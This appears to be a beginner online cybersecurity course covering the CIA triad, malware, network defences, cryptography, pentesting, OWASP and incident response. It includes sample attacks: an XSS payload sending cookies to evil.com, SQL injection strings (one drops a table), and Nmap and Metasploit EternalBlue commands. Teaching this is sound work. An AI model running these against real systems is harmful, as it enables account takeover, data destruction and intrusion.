Cybersecurity Fundamentals — The CIA Triad

CIA triad, threat actors, attack surface · ~8 min
✓ Done ▼

Cybersecurity is the practice of protecting systems, networks and data from digital attacks. Everything in security is built on three core principles — the CIA Triad.

The CIA Triad
C — Confidentiality
  Only authorised people can access information.
  Broken by: data breaches, eavesdropping, phishing
  Protected by: encryption, access controls, 2FA

I — Integrity
  Data must not be altered without authorisation.
  Broken by: man-in-the-middle attacks, tampering
  Protected by: hashing, digital signatures, checksums

A — Availability
  Systems must be accessible when needed.
  Broken by: DDoS attacks, ransomware, hardware failure
  Protected by: backups, redundancy, load balancing
Types of Threat Actors
Script Kiddies
  Low skill — use pre-made tools without understanding.
  Motivation: thrill, showing off.

Hacktivists
  Hack for political/social causes.
  e.g. Anonymous defacing government websites.

Cybercriminals
  Motivated by money. Most common threat.
  e.g. ransomware gangs, bank fraud, identity theft.

Nation-State Actors
  Government-sponsored hackers. Most sophisticated.
  Target: critical infrastructure, espionage.

Insider Threats
  Employees or contractors with inside access.
  Most dangerous — already past the perimeter.

── Hacker classifications ──
White Hat  — ethical hackers, work with permission
Grey Hat   — no permission but no malicious intent  
Black Hat  — criminal hackers, malicious intent
💡

The attack surface is the total set of points where an attacker can try to enter a system — every open port, web form, user account, and USB port counts. Reducing the attack surface is the first step in security.

Types of Malware & Attack Methods

virus, worm, trojan, ransomware, phishing, social engineering · ~10 min
✓ Done ▼

Malware (malicious software) is any software designed to harm, exploit, or gain unauthorised access to systems. Understanding each type is essential for building effective defences.

Malware Types
Virus
  Attaches to legitimate files. Spreads when file runs.
  Requires human action to spread (opening a file).
  Can corrupt or delete data.

Worm
  Self-replicates across networks WITHOUT human action.
  Famous: WannaCry, Conficker, ILOVEYOU
  Can exhaust bandwidth and crash systems.

Trojan
  Disguises itself as legitimate software.
  Once installed, opens a backdoor for the attacker.
  e.g. fake antivirus, cracked games/software.

Ransomware
  Encrypts your files. Demands payment for the key.
  Famous: WannaCry (2017) — hit hospitals worldwide.
  Defence: offline backups, updated systems.

Spyware
  Silently monitors activity — keystrokes, screenshots.
  Sends data to attacker without your knowledge.

Rootkit
  Hides deep in the OS, often at kernel level.
  Extremely difficult to detect and remove.

Keylogger
  Records every keypress — captures passwords, PINs.
  Can be software or hardware (physical USB device).

Botnet
  Network of infected "zombie" computers.
  Controlled remotely for DDoS, spam, cryptomining.
Social Engineering Attacks
Phishing Fake emails pretending to be banks, services, bosses. Goal: steal credentials or install malware. Spear phishing = targeted at specific person. Whaling = targeted at executives/CEOs. Vishing Voice phishing — fake phone calls. e.g. "This is your bank, we need to verify your PIN." Smishing SMS phishing — fake text messages with malicious links. Pretexting Attacker creates a fake scenario to extract info. e.g. posing as IT support to get your password. Baiting Leaving infected USB drives in car parks. Curious people plug them in — instant infection. Tailgating Physically following someone into a secure building.
🛡️

Key defence: Most attacks target people, not technology. Security awareness training is often more valuable than expensive software. Always verify before clicking, and question urgency — attackers rely on panic.

03

Network Security — Firewalls, VPNs & Protocols

firewall, IDS, IPS, VPN, DMZ, TCP/IP · ~11 min
✓ Done ▼

Network security is about protecting data in transit and controlling who can access what within a network. Most cyberattacks travel through networks — understanding how they work is crucial.

Network Attack Types
DDoS — Distributed Denial of Service
  Floods a server with traffic from thousands of IPs.
  Server becomes overwhelmed — legitimate users can't connect.
  Botnet of infected computers sends the traffic.

Man-in-the-Middle (MITM)
  Attacker secretly intercepts communication between two parties.
  e.g. on public Wi-Fi — attacker reads unencrypted traffic.
  Defence: HTTPS, VPN, certificate pinning.

ARP Poisoning
  Attacker sends fake ARP replies on a LAN.
  Associates attacker's MAC with legitimate IP.
  All traffic meant for that IP goes to attacker instead.

DNS Spoofing
  Corrupt DNS cache — redirect domain to attacker's IP.
  User types google.com → lands on fake site.

Port Scanning
  Discovering open ports to find attack entry points.
  Tool: Nmap (Network Mapper) — educational use only.
Network Security Controls
Firewall
  Monitors and filters incoming/outgoing traffic.
  Rules: allow/block based on IP, port, protocol.
  Types: packet filter, stateful, application-layer (WAF).

IDS — Intrusion Detection System
  MONITORS network traffic and alerts on suspicious activity.
  Does NOT block — only detects and logs.

IPS — Intrusion Prevention System
  Like IDS but ACTIVELY blocks detected threats in real-time.

VPN — Virtual Private Network
  Encrypts all traffic between device and VPN server.
  Hides your real IP — makes traffic look like it's from VPN.
  Essential on public Wi-Fi.

DMZ — Demilitarized Zone
  Network zone between public internet and private LAN.
  Public-facing servers (web, email) placed here.
  Protects internal network if DMZ server is compromised.

NAC — Network Access Control
  Checks device health before allowing network access.
  e.g. must have antivirus, OS updates, no malware.
💡

Always use HTTPS — it encrypts data between browser and server. HTTP sends everything in plain text — anyone on the same network can read it. Check for the padlock in your browser's address bar.

04

Cryptography — Encryption, Hashing & PKI

symmetric, asymmetric, hashing, SSL/TLS, certificates · ~12 min
✓ Done ▼

Cryptography is the science of hiding information. It is the backbone of secure communication on the internet — used in HTTPS, banking, messaging, and much more.

Symmetric vs Asymmetric Encryption
Symmetric Encryption
  Same key to encrypt AND decrypt.
  Fast — good for large data.
  Problem: how do you securely share the key?
  Algorithms: AES (most common), DES (old, weak), 3DES

  Alice  ──[encrypt with key]──►  Ciphertext  ──[decrypt with same key]──►  Bob

Asymmetric Encryption (Public Key Cryptography)
  Two keys: PUBLIC key (share with everyone) + PRIVATE key (keep secret).
  What public key encrypts, only private key can decrypt.
  Slower than symmetric — used to exchange symmetric keys.
  Algorithms: RSA, ECC, Diffie-Hellman

  Alice encrypts with Bob's PUBLIC key.
  Only Bob's PRIVATE key can decrypt it.
  Even Alice can't decrypt what she encrypted!
Hashing
Hashing — one-way transformation, not encryption!
  Input → Hash function → Fixed-length output (digest)
  Cannot be reversed — you can't get original from hash.
  Same input ALWAYS gives same hash.

Common algorithms:
  MD5    — 128-bit, BROKEN (collision attacks possible)
  SHA-1  — 160-bit, BROKEN
  SHA-256— 256-bit, SECURE ✅  (used in Bitcoin, TLS)
  SHA-512— 512-bit, very secure ✅

Uses of hashing:
  • Password storage (never store plain passwords!)
  • File integrity checking (detect tampering)
  • Digital signatures
  • Blockchain

── Password hashing with salt ──
Problem: same password → same hash → rainbow tables attack
Solution: add a random SALT before hashing
  password = "abc123"
  salt = "x7fQ2"
  store: sha256("abc123" + "x7fQ2") + salt
SSL/TLS & Digital Certificates
TLS Handshake (what happens when you visit HTTPS site): 1. Client sends: "Hello, I support these cipher suites" 2. Server sends: its digital certificate + public key 3. Client verifies certificate with trusted CA 4. Client generates session key, encrypts with server's public key 5. Server decrypts session key with its private key 6. Both now communicate using fast symmetric encryption Digital Certificate Issued by a Certificate Authority (CA) — e.g. DigiCert, Let's Encrypt. Contains: domain name, public key, expiry, CA signature. Proves the server is who it claims to be. PKI — Public Key Infrastructure The system of CAs, certificates, and policies that makes trust on the internet possible.
⚡

Remember: Encryption is reversible (with the key). Hashing is NOT reversible. Passwords must be hashed + salted, never encrypted — if the key is stolen, all passwords are exposed.

Ethical Hacking — The 5 Phases of Penetration Testing

reconnaissance, scanning, exploitation, post-exploitation, reporting · ~12 min
✓ Done ▼

A penetration test (pentest) is an authorised simulated attack on a system to find vulnerabilities before real attackers do. Ethical hackers follow a structured 5-phase methodology.

01
Reconnaissance (Information Gathering) Collect as much information as possible about the target without touching their systems. Passive = no direct contact. Active = scanning their servers.
02
Scanning & Enumeration Actively probe the target — find open ports, running services, OS version, user accounts. Tools: Nmap, Nessus, Nikto.
03
Gaining Access (Exploitation) Use discovered vulnerabilities to actually break in. Exploit unpatched software, weak passwords, SQL injection, etc. Tools: Metasploit.
04
Maintaining Access (Post-Exploitation) In a real attack, hackers install backdoors to stay in the system. In ethical hacking, you document what a real attacker COULD do from this position.
05
Reporting Write a detailed report of every vulnerability found, how it was exploited, the risk level, and how to fix it. This is what the client pays for.
Reconnaissance Techniques
── PASSIVE Reconnaissance (no direct contact) ──
OSINT (Open Source Intelligence)
  • Google dorking: site:target.com filetype:pdf
  • LinkedIn: find employee names, job roles, tech stack
  • Whois: find domain registration details
  • Shodan: search engine for internet-connected devices
  • Wayback Machine: old versions of websites
  • theHarvester: gather emails, subdomains from public sources

── ACTIVE Reconnaissance (direct contact) ──
DNS enumeration
  Discover subdomains, mail servers, nameservers.
  Tools: dnsenum, fierce, subfinder

Social engineering reconnaissance
  Call the company helpdesk, ask casual questions.
  Most people reveal information when asked politely.
⚠️

Legal note: Every pentest requires a signed Rules of Engagement document and written permission from the target organisation. Without it, every technique in this lesson is illegal — even passive recon can cross legal lines in some jurisdictions.

06

Scanning & Enumeration — Finding Vulnerabilities

Nmap, port scanning, vulnerability scanning, Metasploit · ~12 min
✓ Done ▼

Scanning is the process of actively probing a target to discover its open ports, running services, operating system and potential vulnerabilities. This phase maps the target's attack surface.

Nmap — Network Mapper
# Nmap is the industry-standard port scanner
# ONLY use on systems you OWN or have permission to scan

# Basic scan — check if host is alive
nmap 192.168.1.1

# Scan specific ports
nmap -p 80,443,22,3389 192.168.1.1

# Scan all 65535 ports
nmap -p- 192.168.1.1

# Service and version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 192.168.1.1

# Stealth scan (SYN scan — less detectable)
nmap -sS 192.168.1.1
Common Ports to Know
Port | Service | Notes 21 | FTP | File transfer — often misconfigured 22 | SSH | Secure shell — brute force target 23 | Telnet | Old, unencrypted — dangerous if open 25 | SMTP | Email sending 53 | DNS | Domain resolution 80 | HTTP | Web (unencrypted) 443 | HTTPS | Web (encrypted) 445 | SMB | Windows file sharing — EternalBlue 3306 | MySQL | Database — never expose to internet 3389 | RDP | Windows remote desktop — brute force target 8080 | HTTP-alt | Common for dev servers
Vulnerability Scanning & Metasploit
── Vulnerability Scanners ── Nessus — most popular enterprise vulnerability scanner OpenVAS — free, open-source alternative Nikto — web server vulnerability scanner ── Metasploit Framework ── The most widely used penetration testing tool. Exploits known vulnerabilities with pre-built modules. # Basic Metasploit workflow msfconsole # start Metasploit search eternalblue # search for exploits use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 192.168.1.100 # target IP set LHOST 192.168.1.10 # your IP run # launch exploit ⚠️ Only on systems you own or have permission to test
⚡

Practice in a safe lab environment — set up VMs using VirtualBox or VMware with intentionally vulnerable machines like Metasploitable, HackTheBox or TryHackMe. Never practice on real systems without permission.

Web Application Security — OWASP Top 10

SQL injection, XSS, CSRF, broken auth, IDOR · ~13 min
✓ Done ▼

Web applications are the most attacked surface on the internet. The OWASP Top 10 is the globally recognised list of the most critical web vulnerabilities. Every web developer and security professional must know these.

SQL Injection (SQLi)
── Attacker injects malicious SQL into web inputs ──

Vulnerable login form:
  SQL: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

Normal input:    username = admin,  password = pass123
Attacker input:  username = admin'--
Result SQL:      SELECT * FROM users WHERE username='admin'--' AND password='...'
                                                          ^ comment! password check bypassed!

Attacker logs in as admin without knowing the password!

Other payloads:
  ' OR '1'='1        — always true, returns all records
  '; DROP TABLE users--  — deletes the table!

── Prevention ──
✅ Use parameterised queries / prepared statements
✅ Never build SQL by concatenating user input
✅ Input validation and sanitisation
✅ Use an ORM (Object-Relational Mapper)
XSS, CSRF & Other Key Vulnerabilities
XSS — Cross-Site Scripting Inject malicious JavaScript into a web page. Runs in victim's browser — steals cookies, session tokens. Payload: <script>document.location='http://evil.com?c='+document.cookie</script> Prevention: escape/encode all user output. Use Content Security Policy (CSP). CSRF — Cross-Site Request Forgery Trick victim's browser into making requests they didn't intend. e.g. victim visits evil site → it silently sends bank transfer request using victim's cookies (already logged in to bank). Prevention: CSRF tokens, SameSite cookies, verify Referer header. IDOR — Insecure Direct Object Reference Accessing resources by changing an ID in the URL. e.g. /profile?id=1234 → change to /profile?id=1235 → see someone else's profile! Prevention: check authorisation on every request, not just at login. Broken Authentication Weak session management, no lockout on login attempts. Prevention: strong session tokens, MFA, account lockout, HTTPS. Security Misconfiguration Default passwords, open admin panels, directory listing enabled. Prevention: harden configurations, disable defaults, security checklists.
🏆

Practice web security safely on DVWA (Damn Vulnerable Web Application), bWAPP, or WebGoat — deliberately vulnerable apps designed for learning. Also try PortSwigger Web Security Academy — it's free and excellent.

08

Defence & Incident Response

hardening, SIEM, incident response, forensics, certifications · ~10 min
✓ Done ▼

Understanding attacks is only half the job. The other half is building strong defences and responding effectively when breaches do occur. This is the Blue Team side of cybersecurity.

Security Hardening Best Practices
── System hardening ── ✅ Keep ALL software updated — patch vulnerabilities fast ✅ Principle of least privilege — users only get what they need ✅ Disable unnecessary services and ports ✅ Enable full disk encryption (BitLocker, FileVault) ✅ Enforce strong password policy + MFA everywhere ✅ Regular backups — 3-2-1 rule: 3 copies, 2 different media, 1 offsite ── Network hardening ── ✅ Firewall with deny-all default rule ✅ Network segmentation — separate departments/devices ✅ VPN for remote workers ✅ Monitor logs — know what "normal" looks like ── Password security ── ✅ Use a password manager (Bitwarden, KeePass) ✅ Unique password for EVERY account ✅ 12+ characters, mix of types ❌ Never reuse passwords ❌ Never store plain text passwords
Incident Response & SIEM
── SIEM — Security Information and Event Management ── Collects and analyses logs from across the network. Alerts security team to suspicious patterns in real-time. Tools: Splunk, IBM QRadar, Microsoft Sentinel ── Incident Response Process ── 1. Preparation — have a plan ready before incidents happen 2. Identification— detect and confirm a breach occurred 3. Containment — isolate affected systems to stop spread 4. Eradication — remove malware, close entry points 5. Recovery — restore systems from clean backups 6. Lessons Learned— document what happened, improve defences ── Digital Forensics ── Collecting and preserving evidence after an incident. • Image hard drives (bit-for-bit copies) • Maintain chain of custody • Analyse logs, memory dumps, network captures Tools: Autopsy, Wireshark, Volatility
Cybersecurity Certifications to Pursue
── Beginner ── CompTIA Security+ — industry standard, vendor-neutral Cisco CyberOps — Anotida is Cisco certified! Great start TryHackMe — free learning platform, great for beginners ── Intermediate ── CEH — Certified Ethical Hacker (EC-Council) eJPT— eLearnSecurity Junior Penetration Tester (affordable) HackTheBox — practice labs with real scenarios ── Advanced ── OSCP— Offensive Security Certified Professional (hardest, most respected) CISSP— for security managers/architects CISM — Certified Information Security Manager
